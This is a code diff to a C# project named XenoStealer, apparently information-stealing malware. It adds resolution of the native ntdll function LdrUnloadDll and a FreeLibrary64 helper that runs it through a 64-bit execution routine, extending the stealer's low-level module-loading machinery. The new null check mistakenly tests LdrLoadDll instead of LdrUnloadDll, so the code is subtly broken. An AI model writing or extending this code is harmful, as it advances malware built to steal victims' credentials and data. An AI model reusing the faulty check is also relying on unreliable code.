@@ -30,6 +30,11 @@ namespace XenoStealer
             {
                 return;
             }
+            LdrUnloadDll = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrUnloadDll");
+            if (LdrLoadDll == 0)
+            {
+                return;
+            }
             LdrGetDllHandle = Utils64.GetRemoteProcAddress64Bit(CurrentProcessDuplicateHandle, ntdll64, "LdrGetDllHandle");
             if (LdrGetDllHandle == 0)
             {
@@ -46,6 +51,7 @@ namespace XenoStealer
         public static bool operational = false;
 
         private static ulong LdrLoadDll;
+        private static ulong LdrUnloadDll;
         private static ulong LdrGetDllHandle;
         private static ulong LdrGetProcedureAddress;
         private static IntPtr CurrentProcessDuplicateHandle;
@@ -448,6 +454,11 @@ namespace XenoStealer
                 return 0;
             }
             return ModuleHandle;
+        }
+
+        public static bool FreeLibrary64(ulong ModuleHandle) 
+        {
+            return Execute64(LdrUnloadDll, ModuleHandle)==0;
         }
 
         public static ulong GetProcAddress64(ulong ModuleHandle, string FunctionName)
